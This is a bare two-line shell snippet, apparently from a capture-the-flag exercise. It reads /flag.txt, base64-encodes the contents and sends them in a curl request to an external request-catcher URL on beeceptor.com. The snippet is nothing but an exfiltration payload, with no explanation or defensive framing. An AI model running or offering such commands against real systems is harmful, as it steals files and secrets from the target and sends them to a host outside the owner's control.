TEST=`cat /flag.txt | base64`
curl https://resting09.free.beeceptor.com/$TEST
